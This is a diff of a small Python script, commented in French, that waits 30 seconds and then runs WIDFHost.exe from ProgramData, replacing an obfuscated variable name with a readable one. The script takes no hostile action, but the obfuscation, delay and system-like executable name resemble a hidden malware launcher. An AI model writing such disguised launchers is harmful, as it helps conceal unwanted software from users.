@@ -1,9 +1,15 @@
 import os
 import subprocess
+import time
 
-DSHJDF5646SDFS65DF1265SDFG = os.path.join(os.environ['ProgramData'], 'WIDFHost', 'WIDFHost.exe')
+# Chemin complet vers WIDFHost.exe dans le dossier WIDFHost de ProgramData
+chemin_executable = os.path.join(os.environ['ProgramData'], 'WIDFHost', 'WIDFHost.exe')
 
-if os.path.isfile(DSHJDF5646SDFS65DF1265SDFG):
-    subprocess.run([DSHJDF5646SDFS65DF1265SDFG])
+# Attendre 30 secondes pour s'assurer que l'application est présente
+time.sleep(30)
+
+# Vérifie si le fichier existe et exécute-le
+if os.path.isfile(chemin_executable):
+    subprocess.run([chemin_executable])
 else:
-    print("L'application WIDFHost.exe est introuvable dans ProgramData.")
+    print("L'application WIDFHost.exe est introuvable dans le dossier WIDFHost de ProgramData.")
